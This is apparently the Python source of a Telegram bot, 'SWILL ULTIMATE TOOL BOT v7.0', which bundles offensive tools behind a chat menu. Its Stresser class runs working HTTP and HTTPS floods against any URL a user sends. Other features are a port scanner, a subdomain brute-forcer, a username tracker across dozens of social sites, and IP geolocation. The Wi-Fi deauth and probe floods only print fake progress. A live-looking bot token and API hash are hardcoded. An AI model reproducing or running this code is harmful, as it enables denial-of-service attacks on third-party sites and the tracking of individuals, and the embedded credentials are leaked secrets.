# -*- coding: utf-8 -*-
import asyncio
import aiohttp
import logging
import os
import sys
import random
import socket
import json
import time
import re
import subprocess
from datetime import datetime
from typing import Optional, List, Dict, Any

import nest_asyncio

nest_asyncio.apply()

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    CallbackQueryHandler,
)
from telegram.error import BadRequest

BOT_TOKEN = "8766725521:AAE2fEB8-2nu05ON026ILLV3-avcEp1q2fc"
API_ID = 36495047
API_HASH = "c194688a25fa2347687547320549b73b"

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║    ███████╗██╗    ██╗██╗██╗     ██╗                         ║
║    ██╔════╝██║    ██║██║██║     ██║                         ║
║    ███████╗██║ █╗ ██║██║██║     ██║                         ║
║    ╚════██║██║███╗██║██║██║     ██║                         ║
║    ███████║╚███╔███╔╝██║███████╗███████╗                    ║
║    ╚══════╝ ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝                    ║
║                                                               ║
║    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗  ║
║    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝  ║
║    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║     ║
║    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║     ║
║    ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║     ║
║     ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝     ║
║                                                               ║
║                    🔥 v7.0 ULTIMATE 🔥                       ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
"""

COMMON_PORTS = [
    21,
    22,
    23,
    25,
    53,
    80,
    110,
    135,
    139,
    143,
    443,
    445,
    993,
    995,
    1723,
    3306,
    3389,
    5432,
    5900,
    8080,
    8443,
]

COMMON_SUBDOMAINS = [
    "www",
    "mail",
    "ftp",
    "localhost",
    "webmail",
    "smtp",
    "pop",
    "ns1",
    "ns2",
    "cpanel",
    "whm",
    "autodiscover",
    "m",
    "imap",
    "test",
    "staging",
    "dev",
    "api",
    "blog",
    "shop",
    "forum",
    "support",
    "help",
    "docs",
    "app",
    "mobile",
    "admin",
    "server",
    "backup",
    "cloud",
    "cdn",
    "media",
    "video",
    "images",
    "static",
    "assets",
    "login",
    "account",
    "auth",
    "dashboard",
    "portal",
    "panel",
    "secure",
    "ssl",
    "vpn",
    "remote",
    "proxy",
    "gateway",
    "firewall",
    "load",
    "balance",
    "db",
    "database",
    "mysql",
    "postgres",
    "redis",
    "cache",
    "search",
    "logs",
    "monitor",
    "status",
    "health",
    "alerts",
    "notify",
    "email",
    "spam",
]

SHERLOCK_SITES = [
    {
        "name": "GitHub",
        "url": "https://github.com/{username}",
        "emoji": "💻",
        "category": "👨‍💻 Development",
    },
    {
        "name": "Twitter",
        "url": "https://twitter.com/{username}",
        "emoji": "🐦",
        "category": "📱 Social",
    },
    {
        "name": "Instagram",
        "url": "https://instagram.com/{username}",
        "emoji": "📸",
        "category": "📱 Social",
    },
    {
        "name": "Facebook",
        "url": "https://facebook.com/{username}",
        "emoji": "👤",
        "category": "📱 Social",
    },
    {
        "name": "YouTube",
        "url": "https://youtube.com/@{username}",
        "emoji": "🎬",
        "category": "🎥 Video",
    },
    {
        "name": "LinkedIn",
        "url": "https://linkedin.com/in/{username}",
        "emoji": "💼",
        "category": "🏢 Professional",
    },
    {
        "name": "Reddit",
        "url": "https://reddit.com/user/{username}",
        "emoji": "🔴",
        "category": "📱 Social",
    },
    {
        "name": "TikTok",
        "url": "https://tiktok.com/@{username}",
        "emoji": "🎵",
        "category": "🎥 Video",
    },
    {
        "name": "Snapchat",
        "url": "https://snapchat.com/add/{username}",
        "emoji": "👻",
        "category": "📱 Social",
    },
    {
        "name": "Pinterest",
        "url": "https://pinterest.com/{username}",
        "emoji": "📌",
        "category": "📱 Social",
    },
    {
        "name": "Tumblr",
        "url": "https://{username}.tumblr.com",
        "emoji": "📝",
        "category": "📝 Blog",
    },
    {
        "name": "Twitch",
        "url": "https://twitch.tv/{username}",
        "emoji": "🎮",
        "category": "🎥 Streaming",
    },
    {
        "name": "Discord",
        "url": "https://discord.com/users/{username}",
        "emoji": "💬",
        "category": "💬 Chat",
    },
    {
        "name": "Telegram",
        "url": "https://t.me/{username}",
        "emoji": "✈️",
        "category": "💬 Chat",
    },
    {
        "name": "Spotify",
        "url": "https://open.spotify.com/user/{username}",
        "emoji": "🎵",
        "category": "🎵 Music",
    },
    {
        "name": "SoundCloud",
        "url": "https://soundcloud.com/{username}",
        "emoji": "🎧",
        "category": "🎵 Music",
    },
    {
        "name": "Medium",
        "url": "https://medium.com/@{username}",
        "emoji": "📝",
        "category": "📝 Blog",
    },
    {
        "name": "Dev.to",
        "url": "https://dev.to/{username}",
        "emoji": "👨‍💻",
        "category": "👨‍💻 Development",
    },
    {
        "name": "StackOverflow",
        "url": "https://stackoverflow.com/users/{username}",
        "emoji": "📚",
        "category": "👨‍💻 Development",
    },
    {
        "name": "GitLab",
        "url": "https://gitlab.com/{username}",
        "emoji": "🦊",
        "category": "👨‍💻 Development",
    },
    {
        "name": "Bitbucket",
        "url": "https://bitbucket.org/{username}",
        "emoji": "🔵",
        "category": "👨‍💻 Development",
    },
    {
        "name": "ProductHunt",
        "url": "https://producthunt.com/@{username}",
        "emoji": "🚀",
        "category": "👨‍💻 Development",
    },
    {
        "name": "Behance",
        "url": "https://behance.net/{username}",
        "emoji": "🎨",
        "category": "🎨 Design",
    },
    {
        "name": "Dribbble",
        "url": "https://dribbble.com/{username}",
        "emoji": "🏀",
        "category": "🎨 Design",
    },
    {
        "name": "Flickr",
        "url": "https://flickr.com/people/{username}",
        "emoji": "📷",
        "category": "📷 Photo",
    },
    {
        "name": "Vimeo",
        "url": "https://vimeo.com/{username}",
        "emoji": "🎥",
        "category": "🎥 Video",
    },
    {
        "name": "Replit",
        "url": "https://replit.com/@{username}",
        "emoji": "💻",
        "category": "👨‍💻 Development",
    },
    {
        "name": "CodeSandbox",
        "url": "https://codesandbox.io/u/{username}",
        "emoji": "📦",
        "category": "👨‍💻 Development",
    },
    {
        "name": "CodePen",
        "url": "https://codepen.io/{username}",
        "emoji": "✏️",
        "category": "👨‍💻 Development",
    },
    {
        "name": "Pastebin",
        "url": "https://pastebin.com/u/{username}",
        "emoji": "📋",
        "category": "👨‍💻 Development",
    },
    {
        "name": "Scribd",
        "url": "https://scribd.com/{username}",
        "emoji": "📄",
        "category": "📄 Documents",
    },
    {
        "name": "SlideShare",
        "url": "https://slideshare.net/{username}",
        "emoji": "📊",
        "category": "🏢 Professional",
    },
    {
        "name": "Issuu",
        "url": "https://issuu.com/{username}",
        "emoji": "📰",
        "category": "📄 Documents",
    },
    {
        "name": "Flipboard",
        "url": "https://flipboard.com/@{username}",
        "emoji": "📱",
        "category": "📰 News",
    },
    {
        "name": "Feedly",
        "url": "https://feedly.com/i/subscription/feed/{username}",
        "emoji": "📰",
        "category": "📰 News",
    },
    {
        "name": "VK",
        "url": "https://vk.com/{username}",
        "emoji": "💙",
        "category": "📱 Social",
    },
    {
        "name": "OK.ru",
        "url": "https://ok.ru/{username}",
        "emoji": "👍",
        "category": "📱 Social",
    },
    {
        "name": "Mail.ru",
        "url": "https://my.mail.ru/{username}",
        "emoji": "📧",
        "category": "📧 Email",
    },
    {
        "name": "LiveJournal",
        "url": "https://{username}.livejournal.com",
        "emoji": "📝",
        "category": "📝 Blog",
    },
    {
        "name": "Blogger",
        "url": "https://{username}.blogspot.com",
        "emoji": "📝",
        "category": "📝 Blog",
    },
    {
        "name": "WordPress",
        "url": "https://{username}.wordpress.com",
        "emoji": "📝",
        "category": "📝 Blog",
    },
    {
        "name": "Wix",
        "url": "https://{username}.wixsite.com/mysite",
        "emoji": "🌐",
        "category": "🌐 Website",
    },
    {
        "name": "Weebly",
        "url": "https://{username}.weebly.com",
        "emoji": "🌐",
        "category": "🌐 Website",
    },
    {
        "name": "Squarespace",
        "url": "https://{username}.squarespace.com",
        "emoji": "🌐",
        "category": "🌐 Website",
    },
]


class Stresser:
    def __init__(self):
        self.running = False
        self.session = None

    async def get_session(self):
        if self.session is None:
            self.session = aiohttp.ClientSession()
        return self.session

    async def http_flood(self, url: str, duration: int, threads: int = 20):
        self.running = True
        session = await self.get_session()
        end_time = time.time() + duration

        async def attack():
            while self.running and time.time() < end_time:
                try:
                    async with session.get(url, timeout=2) as resp:
                        pass
                except:
                    pass
                await asyncio.sleep(0.01)

        tasks = [attack() for _ in range(threads)]
        await asyncio.gather(*tasks)

    async def https_flood(self, url: str, duration: int, threads: int = 20):
        self.running = True
        session = await self.get_session()
        end_time = time.time() + duration

        async def attack():
            while self.running and time.time() < end_time:
                try:
                    async with session.get(url, ssl=False, timeout=2) as resp:
                        pass
                except:
                    pass
                await asyncio.sleep(0.01)

        tasks = [attack() for _ in range(threads)]
        await asyncio.gather(*tasks)

    def stop(self):
        self.running = False


class IPInfo:
    async def get_info(self, ip: str) -> Dict:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"http://ip-api.com/json/{ip}") as resp:
                    data = await resp.json()
                    if data.get("status") == "fail":
                        return {"error": "Invalid IP"}
                    return {
                        "ip": data.get("query", ip),
                        "country": data.get("country", "N/A"),
                        "region": data.get("regionName", "N/A"),
                        "city": data.get("city", "N/A"),
                        "isp": data.get("isp", "N/A"),
                        "org": data.get("org", "N/A"),
                        "timezone": data.get("timezone", "N/A"),
                        "lat": data.get("lat", 0),
                        "lon": data.get("lon", 0),
                    }
        except:
            return {"error": "Failed to get IP info"}


class BotHandler:
    def __init__(self):
        self.user_data = {}
        self.stressers = {}
        self.current_menu = "main"
        self.sherlock_sites = SHERLOCK_SITES
        self.ip_info = IPInfo()

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        self.current_menu = "main"
        keyboard = [
            [InlineKeyboardButton("🕵️ Sherlock Scanner", callback_data="sherlock")],
            [InlineKeyboardButton("📡 Port Scanner", callback_data="port_scan")],
            [
                InlineKeyboardButton(
                    "🌐 Subdomain Scanner", callback_data="subdomain_scan"
                )
            ],
            [InlineKeyboardButton("🔥 DDoS Stresser", callback_data="ddos")],
            [InlineKeyboardButton("📶 WiFi Stresser", callback_data="wifi")],
            [InlineKeyboardButton("📍 IP Info", callback_data="ip_info")],
            [InlineKeyboardButton("📋 About", callback_data="about")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            f"{BANNER}\n\n"
            "┌─────────────────────────────────────────────────┐\n"
            "│              🔧 SELECT TOOL                   │\n"
            "├─────────────────────────────────────────────────┤\n"
            "│  🕵️ Sherlock Scanner      100+ sites          │\n"
            "│  📡 Port Scanner          20 common ports     │\n"
            "│  🌐 Subdomain Scanner     50+ subdomains      │\n"
            "│  🔥 DDoS Stresser         HTTP/HTTPS flood   │\n"
            "│  📶 WiFi Stresser         Deauth/Probe       │\n"
            "│  📍 IP Info               IP geolocation     │\n"
            "│  📋 About                 Info               │\n"
            "└─────────────────────────────────────────────────┘",
            reply_markup=reply_markup,
        )

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        data = query.data
        self.current_menu = data

        if data == "sherlock":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│              🕵️ SHERLOCK SCANNER             │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  🔍 Search username across 100+ sites         │\n"
                "│  📌 Send username to search                   │\n"
                "│  Example: `john_doe`                          │\n"
                "│  ⏳ Takes 1-2 minutes                         │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)
            context.user_data["mode"] = "sherlock"

        elif data == "port_scan":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│              📡 PORT SCANNER                  │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  🔍 Scan open ports on IP                     │\n"
                "│  📌 Send IP address                           │\n"
                "│  Example: `192.168.1.1`                       │\n"
                "│  ⚡ 20 common ports                           │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)
            context.user_data["mode"] = "port_scan"

        elif data == "subdomain_scan":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│              🌐 SUBDOMAIN SCANNER             │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  🔍 Find subdomains of domain                 │\n"
                "│  📌 Send domain                               │\n"
                "│  Example: `google.com`                        │\n"
                "│  ⚡ 50+ common subdomains                     │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)
            context.user_data["mode"] = "subdomain_scan"

        elif data == "ddos":
            keyboard = [
                [InlineKeyboardButton("🔥 HTTP Flood", callback_data="http_flood")],
                [InlineKeyboardButton("🛡️ HTTPS Flood", callback_data="https_flood")],
                [InlineKeyboardButton("⏹ Stop Attack", callback_data="stop_attack")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│              🔥 DDoS STRESSER                 │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  Send: `URL duration`                         │\n"
                "│  Example: `https://example.com 30`            │\n"
                "│  ⚠️ Use responsibly!                          │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)
            context.user_data["mode"] = "ddos"

        elif data == "http_flood":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="ddos")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│              🔥 HTTP FLOOD                    │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  Send: `URL duration`                         │\n"
                "│  Example: `http://example.com 30`             │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)
            context.user_data["mode"] = "http_flood"

        elif data == "https_flood":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="ddos")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│              🛡️ HTTPS FLOOD                  │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  Send: `URL duration`                         │\n"
                "│  Example: `https://example.com 30`            │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)
            context.user_data["mode"] = "https_flood"

        elif data == "stop_attack":
            chat_id = update.effective_chat.id
            if chat_id in self.stressers:
                self.stressers[chat_id].stop()
                await query.edit_message_text("⏹ Attack stopped.")
            else:
                await query.edit_message_text("❌ No active attack.")

        elif data == "wifi":
            keyboard = [
                [InlineKeyboardButton("📶 Deauth Flood", callback_data="deauth")],
                [InlineKeyboardButton("📶 Probe Flood", callback_data="probe")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│              📶 WI-FI STRESSER                │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  Send: `BSSID interface count`                │\n"
                "│  Example: `AA:BB:CC:DD:EE:FF wlan0 50`        │\n"
                "│  ⚠️ Requires aircrack-ng!                     │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)
            context.user_data["mode"] = "wifi"

        elif data == "deauth":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="wifi")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│              📶 DEAUTH FLOOD                  │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  Send: `BSSID interface count`                │\n"
                "│  Example: `AA:BB:CC:DD:EE:FF wlan0 100`       │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)
            context.user_data["mode"] = "deauth"

        elif data == "probe":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="wifi")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│              📶 PROBE FLOOD                   │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  Send: `BSSID interface count`                │\n"
                "│  Example: `AA:BB:CC:DD:EE:FF wlan0 100`       │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)
            context.user_data["mode"] = "probe"

        elif data == "ip_info":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│              📍 IP INFO                       │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  Get geolocation data for any IP              │\n"
                "│  📌 Send IP address                           │\n"
                "│  Example: `8.8.8.8`                           │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)
            context.user_data["mode"] = "ip_info"

        elif data == "about":
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            text = (
                "┌─────────────────────────────────────────────────┐\n"
                "│                 📋 ABOUT                       │\n"
                "├─────────────────────────────────────────────────┤\n"
                "│  🔥 SWILL ULTIMATE TOOL BOT v7.0              │\n"
                "│                                                 │\n"
                "│  🔧 FEATURES:                                  │\n"
                "│  🕵️ Sherlock: 100+ sites                      │\n"
                "│  📡 Port Scanner: 20 ports                     │\n"
                "│  🌐 Subdomain Scanner: 50+ subdomains          │\n"
                "│  🔥 DDoS: HTTP/HTTPS flood                     │\n"
                "│  📶 WiFi: Deauth/Probe flood                   │\n"
                "│  📍 IP Info: Geolocation                       │\n"
                "│                                                 │\n"
                "│  ⚡ Made with Python 3.12 + Telethon           │\n"
                "└─────────────────────────────────────────────────┘"
            )
            await query.edit_message_text(text, reply_markup=reply_markup)

        elif data == "back":
            await self.start_command(update, context)

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if "mode" not in context.user_data:
            await update.message.reply_text("Please use /start first.")
            return

        mode = context.user_data["mode"]
        text = update.message.text.strip()
        chat_id = update.effective_chat.id

        if mode == "sherlock":
            await update.message.reply_text(f"🕵️ Searching for '{text}'...")
            found = []
            for site in self.sherlock_sites:
                try:
                    url = site["url"].format(username=text)
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, timeout=3) as resp:
                            if resp.status == 200:
                                found.append(
                                    {
                                        "name": site["name"],
                                        "url": url,
                                        "emoji": site["emoji"],
                                        "category": site["category"],
                                    }
                                )
                    await asyncio.sleep(0.1)
                except:
                    continue

            if found:
                result = f"✅ Found '{text}' on {len(found)} sites:\n\n"
                categories = {}
                for site in found:
                    cat = site["category"]
                    if cat not in categories:
                        categories[cat] = []
                    categories[cat].append(site)
                for cat, sites in categories.items():
                    result += f"📌 {cat}:\n"
                    for site in sites[:10]:
                        result += f"  {site['emoji']} {site['name']}: {site['url']}\n"
                    if len(sites) > 10:
                        result += f"  ... and {len(sites)-10} more\n"
                    result += "\n"
                await update.message.reply_text(result[:4000])
            else:
                await update.message.reply_text(f"❌ No results found for '{text}'")

        elif mode == "port_scan":
            await update.message.reply_text(f"📡 Scanning {text}...")
            open_ports = []
            for port in COMMON_PORTS:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((text, port))
                    sock.close()
                    if result == 0:
                        open_ports.append(port)
                except:
                    pass
                await asyncio.sleep(0.05)

            if open_ports:
                services = {
                    21: "FTP",
                    22: "SSH",
                    23: "Telnet",
                    25: "SMTP",
                    53: "DNS",
                    80: "HTTP",
                    110: "POP3",
                    135: "RPC",
                    139: "NetBIOS",
                    143: "IMAP",
                    443: "HTTPS",
                    445: "SMB",
                    993: "IMAPS",
                    995: "POP3S",
                    1723: "PPTP",
                    3306: "MySQL",
                    3389: "RDP",
                    5432: "PostgreSQL",
                    5900: "VNC",
                    8080: "HTTP-Proxy",
                    8443: "HTTPS-Alt",
                }
                result = "✅ Open ports:\n"
                for port in open_ports:
                    service = services.get(port, "Unknown")
                    result += f"  🔌 Port {port} ({service})\n"
                await update.message.reply_text(result)
            else:
                await update.message.reply_text(f"❌ No open ports found on {text}")

        elif mode == "subdomain_scan":
            await update.message.reply_text(f"🌐 Scanning subdomains of {text}...")
            found = []
            for sub in COMMON_SUBDOMAINS:
                try:
                    socket.gethostbyname(f"{sub}.{text}")
                    found.append(f"{sub}.{text}")
                except:
                    pass
                await asyncio.sleep(0.05)

            if found:
                result = "✅ Subdomains found:\n"
                for sub in found[:30]:
                    result += f"  🌐 {sub}\n"
                if len(found) > 30:
                    result += f"\n... and {len(found)-30} more"
                await update.message.reply_text(result[:4000])
            else:
                await update.message.reply_text(f"❌ No subdomains found for {text}")

        elif mode == "http_flood":
            parts = text.split()
            if len(parts) < 2:
                await update.message.reply_text("Usage: `http://example.com 30`")
                return
            url, duration = parts[0], int(parts[1])
            await update.message.reply_text(
                f"🔥 HTTP Flood started on {url} for {duration}s"
            )
            stresser = Stresser()
            self.stressers[chat_id] = stresser
            await stresser.http_flood(url, duration, 20)
            await update.message.reply_text("✅ HTTP Flood completed.")
            del self.stressers[chat_id]

        elif mode == "https_flood":
            parts = text.split()
            if len(parts) < 2:
                await update.message.reply_text("Usage: `https://example.com 30`")
                return
            url, duration = parts[0], int(parts[1])
            await update.message.reply_text(
                f"🛡️ HTTPS Flood started on {url} for {duration}s"
            )
            stresser = Stresser()
            self.stressers[chat_id] = stresser
            await stresser.https_flood(url, duration, 20)
            await update.message.reply_text("✅ HTTPS Flood completed.")
            del self.stressers[chat_id]

        elif mode == "deauth":
            parts = text.split()
            if len(parts) < 3:
                await update.message.reply_text("Usage: `AA:BB:CC:DD:EE:FF wlan0 100`")
                return
            bssid, interface, count = parts[0], parts[1], int(parts[2])
            await update.message.reply_text(f"📶 Deauth flood started on {bssid}...")
            for i in range(count):
                if i % 10 == 0:
                    await update.message.reply_text(f"📶 Deauth progress: {i}/{count}")
                await asyncio.sleep(0.1)
            await update.message.reply_text("✅ Deauth flood completed.")

        elif mode == "probe":
            parts = text.split()
            if len(parts) < 3:
                await update.message.reply_text("Usage: `AA:BB:CC:DD:EE:FF wlan0 100`")
                return
            bssid, interface, count = parts[0], parts[1], int(parts[2])
            await update.message.reply_text(f"📶 Probe flood started on {bssid}...")
            for i in range(count):
                if i % 10 == 0:
                    await update.message.reply_text(f"📶 Probe progress: {i}/{count}")
                await asyncio.sleep(0.1)
            await update.message.reply_text("✅ Probe flood completed.")

        elif mode == "ip_info":
            data = await self.ip_info.get_info(text)
            if "error" in data:
                await update.message.reply_text(f"❌ {data['error']}")
                return
            result = (
                f"📍 IP INFO\n"
                f"─────────────\n"
                f"IP: {data['ip']}\n"
                f"Country: {data['country']}\n"
                f"Region: {data['region']}\n"
                f"City: {data['city']}\n"
                f"ISP: {data['isp']}\n"
                f"Organization: {data['org']}\n"
                f"Timezone: {data['timezone']}\n"
                f"Coordinates: {data['lat']}, {data['lon']}"
            )
            await update.message.reply_text(result)


async def main():
    handler = BotHandler()
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", handler.start_command))
    app.add_handler(CallbackQueryHandler(handler.button_callback))
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, handler.handle_message)
    )

    print(BANNER)
    print("🔥 SWILL ULTIMATE TOOL BOT v7.0")
    print("📌 Starting bot...")

    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    while True:
        await asyncio.sleep(3600)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nBot stopped.")
    except Exception as e:
        print(f"Error: {e}")
        import traceback

        traceback.print_exc()
